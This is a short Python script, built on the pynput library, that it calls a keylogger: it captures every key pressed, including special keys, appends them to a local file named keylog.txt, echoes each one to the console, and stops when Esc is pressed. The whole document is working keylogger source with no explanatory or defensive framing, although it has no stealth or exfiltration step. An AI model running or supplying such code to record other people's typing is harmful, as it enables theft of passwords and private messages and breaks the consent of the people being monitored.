from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(str(key.char))
            print(f"Logged key: {key.char}")  # Debug output
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f" [{str(key)}] ")
            print(f"Logged special key: {key}")  # Debug output

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("Starting keylogger...")  # Debug output
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
